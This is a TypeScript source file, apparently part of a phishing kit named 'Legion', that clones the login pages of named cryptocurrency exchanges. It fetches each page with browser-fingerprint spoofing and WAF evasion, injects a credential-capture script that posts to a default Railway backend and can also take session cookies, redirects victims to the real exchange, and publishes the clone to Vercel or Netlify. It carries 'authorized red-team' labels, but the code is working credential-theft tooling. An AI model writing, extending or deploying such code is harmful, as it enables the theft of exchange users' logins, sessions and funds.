/**
 * CEX login page static clone helpers.
 */
import { createHash } from 'node:crypto'
import { spawn } from 'node:child_process'
import { mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'

import {
  buildChromeCloneHeaders,
  cloneJa3Fetch,
  isCloneJa3ChromeEnabled,
} from './clone-ja3-fetch.js'
import {
  buildMobileOptimizeCss,
  buildMobileOptimizeJs,
  buildVercelJson,
  pickRotatingFetchHeaders,
} from './training-clone-features.js'

export const DEFAULT_CREDS_BACKEND = 'https://legionapi-production.up.railway.app'
const FETCH_TIMEOUT_MS = 30_000
const MAX_ASSETS = Number.parseInt(process.env['CEX_CLONE_MAX_ASSETS'] ?? '60', 10)
const MAX_BYTES = Number.parseInt(process.env['CEX_CLONE_MAX_BYTES'] ?? '5242880', 10)
const TRAINING_UA = 'Legion-Cex-Clone/1.0 (authorized-red-team)'

const KNOWN_CEX: Record<string, string> = {
  coinbase: 'https://www.coinbase.com',
  binance: 'https://www.binance.com',
  kraken: 'https://www.kraken.com',
  bybit: 'https://www.bybit.com',
  kucoin: 'https://www.kucoin.com',
  okx: 'https://www.okx.com',
  gemini: 'https://www.gemini.com',
  bitfinex: 'https://www.bitfinex.com',
}

export function resolveCexNameFromUrl(target: URL, cliName?: string): string {
  const fromCli = cliName?.trim().toLowerCase()
  if (fromCli) return fromCli.replace(/[^a-z0-9-]/g, '')
  const host = target.hostname.toLowerCase().replace(/^www\./, '')
  const label = host.split('.')[0] ?? 'cex'
  return label.replace(/[^a-z0-9-]/g, '') || 'cex'
}

export function resolveRedirectUrl(target: URL, exchange: string): string {
  const known = KNOWN_CEX[exchange]
  if (known) return known
  return target.origin
}

export function resolveBackendUrl(cli?: string): string {
  const fromCli = cli?.trim()
  if (fromCli) return fromCli.replace(/\/$/, '')
  const fromEnv = process.env['BACKEND_URL']?.trim() || process.env['LEGION_API_URL']?.trim()
  if (fromEnv) return fromEnv.replace(/\/$/, '')
  return DEFAULT_CREDS_BACKEND
}

export async function fetchWithTimeout(url: string, init?: RequestInit): Promise<Response> {
  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS)
  const ja3 = isCloneJa3ChromeEnabled()
  const headers: Record<string, string> = ja3
    ? { ...buildChromeCloneHeaders(), Accept: '*/*', ...(init?.headers as Record<string, string> | undefined) }
    : {
        'User-Agent': TRAINING_UA,
        Accept: '*/*',
        ...pickRotatingFetchHeaders(),
        ...(init?.headers as Record<string, string> | undefined),
      }
  try {
    return await cloneJa3Fetch(url, { ...init, signal: ctrl.signal, headers }, { timeoutMs: FETCH_TIMEOUT_MS })
  } finally {
    clearTimeout(timer)
  }
}

function assetFileName(assetUrl: URL): string {
  const hash = createHash('sha256').update(assetUrl.href).digest('hex').slice(0, 16)
  const ext = path.extname(assetUrl.pathname) || '.bin'
  return `${hash}${ext.length <= 8 ? ext : '.bin'}`
}

export function extractAssetUrls(html: string, base: URL): string[] {
  const found = new Set<string>()
  const patterns = [
    /<link[^>]+href=["']([^"']+)["']/gi,
    /<script[^>]+src=["']([^"']+)["']/gi,
    /<img[^>]+src=["']([^"']+)["']/gi,
    /url\(["']?([^"')]+)["']?\)/gi,
  ]
  for (const re of patterns) {
    let m: RegExpExecArray | null
    while ((m = re.exec(html)) !== null) {
      const href = m[1]?.trim()
      if (!href || href.startsWith('data:') || href.startsWith('blob:')) continue
      try {
        const u = new URL(href, base)
        if (u.protocol !== 'http:' && u.protocol !== 'https:') continue
        if (u.origin !== base.origin) continue
        found.add(u.href)
      } catch {
        /* skip */
      }
    }
  }
  return [...found]
}

export function rewriteHtmlAssets(html: string, base: URL, urlToLocal: Map<string, string>): string {
  let out = html
  for (const [remote, local] of urlToLocal) {
    out = out.split(remote).join(local)
    try {
      const rel = new URL(remote, base).pathname
      if (rel && rel !== '/') out = out.split(rel).join(local)
    } catch {
      /* ignore */
    }
  }
  return out
}

export async function downloadAssets(
  html: string,
  target: URL,
  assetsDir: string,
): Promise<Map<string, string>> {
  const urlToLocal = new Map<string, string>()
  const assetUrls = extractAssetUrls(html, target).slice(0, MAX_ASSETS)
  await mkdir(assetsDir, { recursive: true })

  for (const assetHref of assetUrls) {
    const assetUrl = new URL(assetHref)
    const fileName = assetFileName(assetUrl)
    const localRel = `./assets/${fileName}`
    urlToLocal.set(assetUrl.href, localRel)
    try {
      const res = await fetchWithTimeout(assetUrl.href)
      if (!res.ok) continue
      const buf = Buffer.from(await res.arrayBuffer())
      if (buf.length > MAX_BYTES) continue
      await writeFile(path.join(assetsDir, fileName), buf)
    } catch {
      /* skip asset */
    }
  }
  return urlToLocal
}

export function parseCaptureSessionCookiesEnv(value: string | undefined): boolean {
  const v = value?.trim().toLowerCase()
  if (!v) return true
  if (v === 'false' || v === '0' || v === 'no') return false
  return v === 'true' || v === '1' || v === 'yes'
}

export async function buildCredCaptureJs(opts: {
  backendUrl: string
  exchange: string
  redirectUrl: string
  apiKey?: string
  captureSessionCookies?: boolean
}): Promise<string> {
  const { readFile } = await import('node:fs/promises')
  const { fileURLToPath } = await import('node:url')
  const resolved = fileURLToPath(new URL('./cex-cred-capture.js', import.meta.url))
  let template = await readFile(resolved, 'utf8')
  template = template.replace(/__BACKEND_URL__/g, opts.backendUrl.replace(/\/$/, ''))
  template = template.replace(/__EXCHANGE__/g, opts.exchange)
  template = template.replace(/__REDIRECT_URL__/g, opts.redirectUrl)
  template = template.replace(/__API_KEY__/g, opts.apiKey?.trim() ?? '')
  const captureSession =
    opts.captureSessionCookies ??
    parseCaptureSessionCookiesEnv(process.env['CEX_CAPTURE_SESSION_COOKIES'])
  template = template.replace(/__CAPTURE_SESSION_COOKIES__/g, String(captureSession))
  return template
}

/** Fetch login HTML — WAF probe + headless fallback for Tier-S CEX targets. */
export async function fetchCexLoginHtml(
  target: URL,
  outDir: string,
): Promise<{ html: string; usedHeadless: boolean }> {
  const { runMirrorProbePipeline } = await import('./mirror-target-pipeline.js')
  const pipeline = await runMirrorProbePipeline(target, outDir, { force: true })
  if (pipeline.html && pipeline.html.length > 512) {
    return { html: pipeline.html, usedHeadless: pipeline.usedHeadless === true }
  }

  const res = await fetchWithTimeout(target.href, { headers: { Accept: 'text/html' } })
  if (res.ok) {
    const html = await res.text()
    return { html, usedHeadless: false }
  }
  throw new Error(`Failed to fetch CEX login page: HTTP ${res.status}`)
}

export function buildCexStaticDockerCompose(hostPort = 8080): string {
  return `# Legion CEX static clone — authorized red-team credential capture
services:
  cex-static:
    image: nginx:alpine
    container_name: legion-cex-static
    ports:
      - "${hostPort}:80"
    volumes:
      - ./:/usr/share/nginx/html:ro
      - ./nginx-cex-static.conf:/etc/nginx/conf.d/default.conf:ro
    restart: unless-stopped
`
}

export function buildCexStaticNginxConfig(): string {
  return `server {
  listen 80;
  server_name localhost;
  root /usr/share/nginx/html;
  index index.html;

  location / {
    try_files $uri $uri/ /index.html;
    add_header Cache-Control "no-store";
  }

  location ^~ /assets/ {
    try_files $uri =404;
  }
}
`
}

export async function writeCexStaticServeFiles(outDir: string, hostPort = 8080): Promise<void> {
  await writeFile(path.join(outDir, 'nginx-cex-static.conf'), buildCexStaticNginxConfig(), 'utf8')
  await writeFile(path.join(outDir, 'docker-compose.yml'), buildCexStaticDockerCompose(hostPort), 'utf8')
}

export function injectCexScripts(html: string, mobileOptimize: boolean): string {
  const tags = [
    '<script src="./legion-cex-capture.js" defer></script>',
  ]
  if (mobileOptimize) {
    tags.push('<link rel="stylesheet" href="./legion-mobile-optimize.css" />')
    tags.push('<script src="./legion-mobile-optimize.js" defer></script>')
  }
  const bundle = tags.join('\n')
  if (html.includes('</body>')) return html.replace('</body>', `${bundle}\n</body>`)
  return `${html}\n${bundle}`
}

export async function writeMobileOptimizeAssets(outDir: string): Promise<void> {
  await writeFile(path.join(outDir, 'legion-mobile-optimize.css'), buildMobileOptimizeCss(), 'utf8')
  await writeFile(path.join(outDir, 'legion-mobile-optimize.js'), buildMobileOptimizeJs(), 'utf8')
}

function runCommand(
  cmd: string,
  args: string[],
  cwd: string,
  env: Record<string, string>,
): Promise<{ stdout: string; stderr: string; code: number }> {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, {
      cwd,
      env: { ...process.env, ...env },
      shell: process.platform === 'win32',
    })
    let stdout = ''
    let stderr = ''
    child.stdout?.on('data', (d: Buffer) => { stdout += d.toString() })
    child.stderr?.on('data', (d: Buffer) => { stderr += d.toString() })
    child.on('error', reject)
    child.on('close', (code) => resolve({ stdout, stderr, code: code ?? 1 }))
  })
}

export async function deployStaticClone(outDir: string): Promise<string | null> {
  const vercelToken = process.env['VERCEL_TOKEN']?.trim()
  const netlifyToken = process.env['NETLIFY_TOKEN']?.trim()

  if (vercelToken) {
    await writeFile(path.join(outDir, 'vercel.json'), buildVercelJson(), 'utf8')
    const result = await runCommand(
      'npx',
      ['--yes', 'vercel', 'deploy', '--yes', '--token', vercelToken],
      outDir,
      { VERCEL_TOKEN: vercelToken },
    )
    if (result.code !== 0) return null
    const match = result.stdout.match(/https:\/\/[^\s]+/g)
    return match?.[match.length - 1] ?? null
  }

  if (netlifyToken) {
    const result = await runCommand(
      'npx',
      ['--yes', 'netlify', 'deploy', '--dir', '.', '--prod', '--auth', netlifyToken, '--message', 'legion-cex-clone'],
      outDir,
      { NETLIFY_AUTH_TOKEN: netlifyToken },
    )
    if (result.code !== 0) return null
    const match = result.stdout.match(/https:\/\/[^\s]+\.netlify\.app[^\s]*/i)
    return match?.[0] ?? null
  }

  return null
}
